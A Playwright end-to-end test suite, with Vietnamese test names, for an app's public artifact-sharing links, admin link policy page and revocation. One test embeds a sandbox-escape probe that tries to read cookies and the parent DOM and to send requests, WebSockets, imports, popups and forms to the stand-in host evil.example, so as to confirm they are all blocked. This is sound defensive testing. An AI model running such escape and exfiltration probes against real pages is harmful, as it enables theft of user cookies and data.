import { type ChildProcess, execFile, spawn } from "node:child_process";
import { randomBytes } from "node:crypto";
import { once } from "node:events";
import { setTimeout as delay } from "node:timers/promises";
import { fileURLToPath } from "node:url";
import { promisify } from "node:util";
import { type BrowserContext, expect, type Page, test } from "@playwright/test";
import { PostgreSqlContainer, type StartedPostgreSqlContainer } from "@testcontainers/postgresql";
import type { ArtifactWriteResult } from "@xdev-hive/contracts";
import {
  ARTIFACT_ORG,
  type ArtifactsFixture,
  artifactsFixture,
  COLLEAGUE,
  fail,
  fakeArtifactFrames,
  fakeHub,
  USER,
} from "./fake-hub.ts";

async function openOwner(page: Page, fixture: ArtifactsFixture, role: "member" | "admin" = "member") {
  await page.addInitScript((id) => localStorage.setItem("hive.org", id), ARTIFACT_ORG.id);
  await fakeArtifactFrames(page, fixture);
  return fakeHub(page, { signedIn: true, rpc: fixture.rpcFor(USER, role) });
}

async function createLink(page: Page, id: string) {
  await page.goto(`/artifacts/${id}`);
  await page.getByRole("button", { name: "Link công khai", exact: true }).click();
  const dialog = page.getByRole("dialog", { name: "Link công khai" });
  await dialog.getByRole("button", { name: "Tạo link", exact: true }).click();
  const link = dialog.getByRole("textbox", { name: "Link công khai" });
  await expect(link).not.toHaveValue("");
  return link.inputValue();
}

function seedLink(fixture: ArtifactsFixture, id: string, user = USER) {
  const handler = fixture.rpcFor(user)["artifacts/publicLinks/create"];
  if (!handler) throw new Error("Thiếu route tạo link thử nghiệm");
  const input = { id, version: 1, expiresInDays: 7 };
  const result = handler(
    input,
    { path: "artifacts/publicLinks/create", method: "POST", org: ARTIFACT_ORG.id, input },
    { signedIn: true, authCalls: [], meMethods: [], rpcCalls: [] },
  );
  expect(result.status).toBe(200);
  return (result.json as { json: { url: string } }).json.url;
}

test("link công khai: ghim bản react, không cookie, không lộ dữ liệu tổ chức; thu hồi cả vé cũ (SC-008)", async ({
  page,
  browser,
}) => {
  const fixture = artifactsFixture();
  const app = fixture.leaderSave({
    type: "react",
    title: "Bảng giá công khai",
    content: "export default function App() { return <h1>Bản đã công khai</h1>; }",
    compiled:
      'import { jsx } from "react/jsx-runtime"; export default function App() { return jsx("h1", { children: "Bản đã công khai" }); }',
  });
  await openOwner(page, fixture);
  const url = await createLink(page, app.id);
  fixture.leaderSave({
    id: app.id,
    content: "Bản riêng mới",
    compiled: 'export default function App() { throw new Error("Không được lộ bản mới"); }',
  });

  const context = await browser.newContext();
  const guest = await context.newPage();
  const { frameRequests } = await fakeArtifactFrames(guest, fixture);
  const requests: string[] = [];
  guest.on("request", (r) => requests.push(new URL(r.url()).pathname));
  const response = await guest.goto(url);
  expect(response?.status()).toBe(200);
  expect(response?.headers()).toMatchObject({
    "cache-control": "no-store",
    "referrer-policy": "no-referrer",
    "x-robots-tag": "noindex, nofollow",
  });
  expect(response?.headers()["content-security-policy"]).toContain("default-src 'none'");
  await expect(guest.locator("script")).toHaveCount(0);
  await expect(guest.getByRole("heading", { name: app.title })).toBeVisible();
  await expect(guest.frameLocator("iframe").getByRole("heading", { name: "Bản đã công khai" })).toBeVisible();
  await expect(guest.locator("iframe")).toHaveAttribute("sandbox", "allow-scripts");
  await expect(guest.getByText("Nội dung do agent tạo", { exact: false })).toBeVisible();
  await expect(guest.locator("body")).not.toContainText(ARTIFACT_ORG.name);
  await expect(guest.locator("body")).not.toContainText(USER.name);
  await expect(guest.getByRole("button", { name: "Nhờ Leader sửa" })).toHaveCount(0);
  expect(await context.cookies()).toEqual([]);
  expect(requests.some((path) => path.startsWith("/rpc") || path.startsWith("/api/auth"))).toBe(false);
  expect(frameRequests.every((r) => /\/_artifact\/(frame|lib)\//.test(r))).toBe(true);
  const frameUrl = await guest.locator("iframe").getAttribute("src");

  const dialog = page.getByRole("dialog", { name: "Link công khai" });
  await dialog.getByRole("button", { name: "Thu hồi…" }).click();
  await dialog.getByRole("button", { name: "Thu hồi link", exact: true }).click();
  await expect(dialog.getByText("Đã thu hồi", { exact: true }).first()).toBeVisible();
  expect((await guest.goto(url))?.status()).toBe(404);
  await expect(guest.getByText("Liên kết không tồn tại hoặc đã hết hạn.")).toBeVisible();
  expect((await guest.goto(frameUrl as string))?.status()).toBe(404);
  await context.close();
});

test("quản trị: chỉ thông tin link riêng của người khác, lưu chính sách, bật lại và thu hồi", async ({
  page,
  browser,
}) => {
  const fixture = artifactsFixture();
  const artifact = fixture.leaderSave({
    type: "markdown",
    title: "Bản nháp riêng",
    content: "NỘI DUNG RIÊNG KHÔNG HIỆN Ở QUẢN TRỊ",
  });
  artifact.ownerId = COLLEAGUE.id;
  const url = seedLink(fixture, artifact.id, COLLEAGUE);
  const hub = await openOwner(page, fixture, "admin");
  await page.goto("/admin/public-links");
  await expect(page.getByRole("heading", { name: "Link công khai", level: 1 })).toBeVisible();
  const list = page.getByRole("region", { name: "Link chưa hết hạn và chưa thu hồi" });
  await expect(list).toContainText(artifact.title);
  await expect(list).toContainText(COLLEAGUE.name);
  await expect(list.getByRole("link")).toHaveCount(0);
  await expect(page.locator("body")).not.toContainText("NỘI DUNG RIÊNG");
  expect(hub.rpcCalls.filter((c) => c.path === "artifacts/get")).toHaveLength(0);

  const days = page.getByLabel("Hạn tối đa (ngày)");
  await days.fill("31");
  await expect(page.getByText("Nhập số nguyên từ 1 đến 30.")).toBeVisible();
  await expect(page.getByRole("button", { name: "Lưu chính sách" })).toBeDisabled();
  await days.fill("3");
  // Một quản trị khác vừa thay mục khác; lưu link phải ghép trên bản mới nhất.
  fixture.state.policy.artifacts.maxVersions = 80;
  await page.getByRole("switch", { name: "Cho phép link công khai" }).uncheck();
  await page.getByRole("button", { name: "Lưu chính sách" }).click();
  const disableDialog = page.getByRole("dialog", { name: "Tắt link công khai?" });
  await expect(disableDialog).toBeVisible();
  await disableDialog.getByRole("button", { name: "Thôi" }).click();
  expect(fixture.state.policy.artifacts.publicLinks.enabled).toBe(true);
  await page.getByRole("button", { name: "Lưu chính sách" }).click();
  await disableDialog.getByRole("button", { name: "Tắt link công khai", exact: true }).click();
  await expect(page.getByText("Đã lưu chính sách link công khai.")).toBeVisible();
  expect(fixture.state.policy.artifacts).toMatchObject({
    maxVersions: 80,
    publicLinks: { enabled: false, maxDays: 3 },
  });
  await expect(list.getByRole("button", { name: "Thu hồi…" })).toBeEnabled();

  const context = await browser.newContext();
  const guest = await context.newPage();
  await fakeArtifactFrames(guest, fixture);
  expect((await guest.goto(url))?.status()).toBe(404);
  await page.getByRole("switch", { name: "Cho phép link công khai" }).check();
  await page.getByRole("button", { name: "Lưu chính sách" }).click();
  await expect(page.getByRole("button", { name: "Lưu chính sách" })).toBeDisabled();
  expect((await guest.goto(url))?.status()).toBe(200);
  await list.getByRole("button", { name: "Thu hồi…" }).click();
  await list.getByRole("button", { name: "Thu hồi link" }).click();
  await expect(list.getByText("Chưa có link công khai")).toBeVisible();
  expect((await guest.goto(url))?.status()).toBe(404);
  await context.close();
});

test("quản trị: 360 px, tối; phân trang, lỗi tải và lỗi thu hồi có thể thử lại", async ({ page }) => {
  await page.setViewportSize({ width: 360, height: 740 });
  await page.addInitScript(() => localStorage.setItem("hive.theme", "dark"));
  const fixture = artifactsFixture();
  const handlers = fixture.rpcFor(USER, "admin");
  for (let i = 0; i < 51; i++) {
    const a = fixture.leaderSave({ type: "html", title: `Bảng giá ${i}`, content: "<h1>Bảng giá</h1>" });
    seedLink(fixture, a.id);
  }
  await page.addInitScript((id) => localStorage.setItem("hive.org", id), ARTIFACT_ORG.id);
  let loadFails = true;
  let revokeFails = true;
  const hub = await fakeHub(page, {
    signedIn: true,
    rpc: {
      ...handlers,
      "artifacts/publicLinks/orgList": (...args) =>
        loadFails
          ? fail("INTERNAL_SERVER_ERROR", 500, "Không tải được link.")
          : (handlers["artifacts/publicLinks/orgList"]?.(...args) as never),
      "artifacts/publicLinks/revoke": (...args) =>
        revokeFails
          ? fail("FORBIDDEN", 403, "Không thu hồi được link.")
          : (handlers["artifacts/publicLinks/revoke"]?.(...args) as never),
    },
  });
  await page.goto("/admin/public-links");
  await expect(page.getByText("Không tải được link.")).toBeVisible();
  loadFails = false;
  await page.getByRole("button", { name: "Tải lại" }).click();
  const list = page.getByRole("region", { name: "Link chưa hết hạn và chưa thu hồi" });
  await expect(list.getByRole("listitem")).toHaveCount(50);
  await list.getByRole("button", { name: "Tải thêm" }).click();
  await expect(list.getByRole("listitem")).toHaveCount(51);
  expect(
    hub.rpcCalls.find((c) => c.path === "artifacts/publicLinks/orgList" && (c.input as { cursor?: string }).cursor)
      ?.input,
  ).toMatchObject({ cursor: "50" });
  expect(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth)).toBe(true);
  await list.getByRole("button", { name: "Thu hồi…" }).first().click();
  await list.getByRole("button", { name: "Thu hồi link" }).click();
  await expect(list.getByText("Không thu hồi được link.")).toBeVisible();
  revokeFails = false;
  await list.getByRole("button", { name: "Thu hồi…" }).first().click();
  await list.getByRole("button", { name: "Thu hồi link" }).click();
  await expect(list.getByRole("listitem")).toHaveCount(50);
});

test("thành viên mở URL quản trị: không gọi dữ liệu chính sách hay danh sách link", async ({ page }) => {
  const hub = await openOwner(page, artifactsFixture());
  await page.goto("/admin/public-links");
  await expect(page.getByText("Chỉ quản trị tổ chức được quản lý link công khai.")).toBeVisible();
  expect(hub.rpcCalls.some((c) => c.path.startsWith("policies/") || c.path === "artifacts/publicLinks/orgList")).toBe(
    false,
  );
});

test("quản trị: ngoại tuyến giữ bản nháp, khoá lưu và thu hồi", async ({ page, context }) => {
  const fixture = artifactsFixture();
  const a = fixture.leaderSave({ type: "markdown", title: "Bản nháp", content: "# Bản nháp" });
  seedLink(fixture, a.id);
  await openOwner(page, fixture, "admin");
  await page.goto("/admin/public-links");
  await page.getByLabel("Hạn tối đa (ngày)").fill("5");
  await context.setOffline(true);
  await expect(page.getByText("Đang ngoại tuyến. Kết nối lại để lưu chính sách hoặc thu hồi link.")).toBeVisible();
  await expect(page.getByRole("button", { name: "Lưu chính sách" })).toBeDisabled();
  await expect(page.getByRole("button", { name: "Thu hồi…" })).toBeDisabled();
  await context.setOffline(false);
  await expect(page.getByLabel("Hạn tối đa (ngày)")).toHaveValue("5");
  await expect(page.getByRole("button", { name: "Lưu chính sách" })).toBeEnabled();
});

test("link công khai: mã sai, hết hạn, xoá và chuyển chủ trả cùng 404; giới hạn 60/phút trả 429", async ({ page }) => {
  const fixture = artifactsFixture();
  const a = fixture.leaderSave({ type: "html", title: "Trang công khai", content: "<h1>Trang công khai</h1>" });
  const url = seedLink(fixture, a.id);
  await fakeArtifactFrames(page, fixture);
  const missing = await page.goto("/_artifact/s/sai");
  const body = await missing?.text();
  const link = fixture.state.publicLinks[0];
  if (!link) throw new Error("Thiếu link thử nghiệm");
  const expiresAt = link.expiresAt;
  link.expiresAt = new Date(0).toISOString();
  const expired = await page.goto(url);
  expect(expired?.status()).toBe(404);
  expect(await expired?.text()).toBe(body);
  link.expiresAt = expiresAt;
  a.deletedAt = new Date().toISOString();
  expect(await (await page.goto(url))?.text()).toBe(body);
  a.deletedAt = null;
  a.ownerId = COLLEAGUE.id;
  expect(await (await page.goto(url))?.text()).toBe(body);
  for (let i = fixture.state.publicRequests.length; i < 60; i++)
    expect((await page.goto("/_artifact/s/sai"))?.status()).toBe(404);
  const limited = await page.goto("/_artifact/s/sai");
  expect(limited?.status()).toBe(429);
  expect(limited?.headers()["retry-after"]).toBe("60");
  await expect(page.getByText("Quá nhiều yêu cầu. Thử lại sau.")).toBeVisible();
});

for (const type of ["html", "react"] as const) {
  test(`trang công khai ${type}: ca thoát cookie, DOM, mạng, popup, form, import (SC-001)`, async ({ page }) => {
    const fixture = artifactsFixture();
    const script = `const results = [];
      const attempt = async (fn) => { try { await fn(); results.push("leak"); } catch { results.push("blocked"); } };
      await attempt(() => document.cookie);
      await attempt(() => parent.document.body.innerHTML);
      await attempt(() => fetch("/rpc/me/get"));
      await attempt(() => fetch("https://evil.example/fetch"));
      await attempt(() => new Promise((resolve, reject) => {
        const socket = new WebSocket("wss://evil.example/socket");
        socket.onopen = resolve; socket.onerror = reject;
      }));
      await attempt(() => import("https://evil.example/import.js"));
      await attempt(() => navigator.serviceWorker.register("/sw.js"));
      await attempt(() => { if (!window.open("https://evil.example/popup")) throw new Error("blocked"); });
      try { top.location.href = "https://evil.example/top"; } catch {}
      const form = document.createElement("form"); form.action = "https://evil.example/form"; document.body.append(form); form.submit();
      document.body.dataset.results = JSON.stringify(results);`;
    const a = fixture.leaderSave({
      type,
      title: "Thử thoát",
      content: `<h1>Thử thoát</h1><img src="https://evil.example/pixel"><script>(async () => { ${script} })();</script>`,
      ...(type === "react"
        ? {
            compiled: `import { useEffect } from "react"; export default function App() { useEffect(() => { (async () => { ${script} })(); }, []); return null; }`,
          }
        : {}),
    });
    const url = seedLink(fixture, a.id);
    const { frameRequests } = await fakeArtifactFrames(page, fixture);
    const escaped: string[] = [];
    await page.route("https://evil.example/**", (route) => {
      escaped.push(route.request().url());
      return route.abort();
    });
    await page.goto(url);
    await expect(page.frameLocator("iframe").locator("body")).toHaveAttribute(
      "data-results",
      JSON.stringify(Array(8).fill("blocked")),
    );
    expect(escaped).toEqual([]);
    expect(frameRequests.every((r) => /\/_artifact\/(frame|lib)\//.test(r))).toBe(true);
    expect(new URL(page.url()).pathname).toBe(url);
  });
}

// Hub chạy ở tiến trình riêng để web không import code của app khác; cổng riêng tránh chạm hub dev.
test.describe("hub thật + Postgres", () => {
  test.skip(
    process.env.HIVE_ARTIFACT_REAL_HUB !== "1",
    "Chạy riêng với HIVE_ARTIFACT_REAL_HUB=1 và HIVE_WEB_E2E_PORT=4175.",
  );
  let container: StartedPostgreSqlContainer | undefined;
  let hub: ChildProcess | undefined;
  test.beforeAll(async () => {
    test.setTimeout(60_000);
    const hubDir = fileURLToPath(new URL("../../hub/", import.meta.url));
    const image = process.env.HIVE_TEST_POSTGRES_IMAGE ?? "pgvector/pgvector:0.8.7-pg18-trixie";
    container = await new PostgreSqlContainer(image).withDatabase("hive").start();
    const adminUrl = container.getConnectionUri();
    const as = (user: string, password: string) => {
      const url = new URL(adminUrl);
      url.username = user;
      url.password = password;
      return url.toString();
    };
    const env = {
      ...Object.fromEntries(Object.entries(process.env).filter(([key]) => !key.startsWith("HIVE_"))),
      HIVE_DATABASE_ADMIN_URL: adminUrl,
      HIVE_DB_OWNER_PASSWORD: "owner-e2e",
      HIVE_DB_APP_PASSWORD: "app-e2e",
      HIVE_DB_AUTH_PASSWORD: "auth-e2e",
      HIVE_DATABASE_OWNER_URL: as("hive_owner", "owner-e2e"),
      HIVE_DATABASE_URL: as("hive_app", "app-e2e"),
      HIVE_DATABASE_AUTH_URL: as("hive_auth", "auth-e2e"),
      HIVE_PORT: "4311",
      HIVE_PUBLIC_URL: "http://localhost:4175",
      HIVE_AUTH_SECRET: randomBytes(32).toString("base64"),
      HIVE_MASTER_KEY: randomBytes(32).toString("base64"),
      HIVE_ALLOW_EMAIL_SIGNUP: "1",
      HIVE_ORG_CREATORS: "duy@e2e.test",
      HIVE_WORKER_RELEASES: "off",
      HIVE_DESKTOP_RELEASES: "off",
    };
    const command = promisify(execFile);
    await command(process.execPath, ["src/cli.ts", "db:bootstrap"], { cwd: hubDir, env });
    await command(process.execPath, ["src/cli.ts", "db:migrate"], { cwd: hubDir, env });
    hub = spawn(process.execPath, ["src/main.ts"], { cwd: hubDir, env, stdio: ["ignore", "ignore", "inherit"] });
    for (let i = 0; i < 150; i++) {
      if (hub.exitCode !== null) throw new Error(`Hub dừng khi khởi động (mã ${hub.exitCode}).`);
      try {
        if ((await fetch("http://127.0.0.1:4311/api/v1/health")).ok) return;
      } catch {
        /* Hub chưa nghe cổng. */
      }
      await delay(200);
    }
    throw new Error("Hub chưa sẵn sàng sau 30 giây.");
  });
  test.afterAll(async () => {
    try {
      if (hub && hub.exitCode === null) {
        hub.kill();
        await once(hub, "exit");
      }
    } finally {
      await container?.stop();
    }
  });

  async function forwardToHub(context: BrowserContext) {
    await context.route(/\/(api\/|rpc\/|_artifact\/)/, async (route) => {
      const url = new URL(route.request().url());
      url.hostname = "127.0.0.1";
      url.port = "4311";
      const response = await route.fetch({ url: url.toString() });
      await route.fulfill({ response });
    });
  }

  async function rpc<T>(page: Page, path: string, input: unknown, org?: string): Promise<T> {
    return page.evaluate(
      async ({ path, input, org }) => {
        const response = await fetch(`/rpc/${path}`, {
          method: "POST",
          headers: { "Content-Type": "application/json", ...(org ? { "x-hive-org": org } : {}) },
          body: JSON.stringify({ json: input }),
        });
        const result = await response.json();
        if (!response.ok) throw new Error(JSON.stringify(result));
        return result.json;
      },
      { path, input, org },
    );
  }

  test("trình duyệt tạo link react, khách xem, quản trị tắt/bật/thu hồi và gửi lỗi thật tới Leader", async ({
    page,
    context,
    browser,
  }) => {
    test.slow();
    await forwardToHub(context);
    await page.goto("/login");
    const signedUp = await page.evaluate(async () => {
      const response = await fetch("/api/auth/sign-up/email", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ name: "Trần Đức Duy", email: "duy@e2e.test", password: "mat-khau-e2e-0123" }),
      });
      return { status: response.status, body: await response.text() };
    });
    expect(signedUp.status, signedUp.body).toBe(200);
    const org = await rpc<{ id: string }>(page, "orgs/create", { name: "Tổ chức thử artifact", slug: "artifact-e2e" });
    await page.evaluate((id) => localStorage.setItem("hive.org", id), org.id);
    const artifact = await rpc<ArtifactWriteResult>(
      page,
      "artifacts/create",
      {
        type: "react",
        title: "Bảng giá thật",
        content: "export default function App() { return <h1>Bảng giá từ Postgres</h1>; }",
      },
      org.id,
    );
    const url = await createLink(page, artifact.artifact.id);
    const guestContext = await browser.newContext();
    await forwardToHub(guestContext);
    const guest = await guestContext.newPage();
    expect((await guest.goto(url))?.status()).toBe(200);
    await expect(guest.frameLocator("iframe").getByRole("heading", { name: "Bảng giá từ Postgres" })).toBeVisible();
    expect(await guestContext.cookies()).toEqual([]);

    await page.goto("/admin/public-links");
    const list = page.getByRole("region", { name: "Link chưa hết hạn và chưa thu hồi" });
    await expect(list).toContainText("Bảng giá thật");
    await page.getByRole("switch", { name: "Cho phép link công khai" }).uncheck();
    await page.getByRole("button", { name: "Lưu chính sách" }).click();
    await page
      .getByRole("dialog", { name: "Tắt link công khai?" })
      .getByRole("button", { name: "Tắt link công khai", exact: true })
      .click();
    await expect(page.getByText("Đã lưu chính sách link công khai.")).toBeVisible();
    expect((await guest.goto(url))?.status()).toBe(404);
    await page.getByRole("switch", { name: "Cho phép link công khai" }).check();
    await page.getByRole("button", { name: "Lưu chính sách" }).click();
    await expect(page.getByRole("button", { name: "Lưu chính sách" })).toBeDisabled();
    expect((await guest.goto(url))?.status()).toBe(200);
    await list.getByRole("button", { name: "Thu hồi…" }).click();
    await list.getByRole("button", { name: "Thu hồi link" }).click();
    await expect(list.getByText("Chưa có link công khai")).toBeVisible();
    expect((await guest.goto(url))?.status()).toBe(404);

    const brokenArtifact = await rpc<ArtifactWriteResult>(
      page,
      "artifacts/create",
      {
        type: "react",
        title: "Trang lỗi thật",
        content: 'export default function App() { throw new Error("Lỗi thật từ trang"); }',
      },
      org.id,
    );
    await page.goto(`/artifacts/${brokenArtifact.artifact.id}`);
    await page.getByRole("button", { name: "Nhờ Leader sửa" }).click();
    await page.getByRole("dialog", { name: "Nhờ Leader sửa" }).getByRole("button", { name: "Gửi yêu cầu sửa" }).click();
    await expect(page).toHaveURL(/\/leader\?thread=/);
    await expect(
      page
        .getByRole("list", { name: "Tin nhắn" })
        .getByRole("article", { name: "Artifact Trang lỗi thật, phiên bản 1" }),
    ).toBeVisible();
    const threadId = new URL(page.url()).searchParams.get("thread");
    const thread = await rpc<{ messages: { pageErrors: { message: string }[] | null }[] }>(
      page,
      "leader/threads/get",
      { id: threadId },
      org.id,
    );
    expect(
      thread.messages.some((message) =>
        message.pageErrors?.some((error) => error.message.includes("Lỗi thật từ trang")),
      ),
    ).toBe(true);
    await guestContext.close();
  });
});
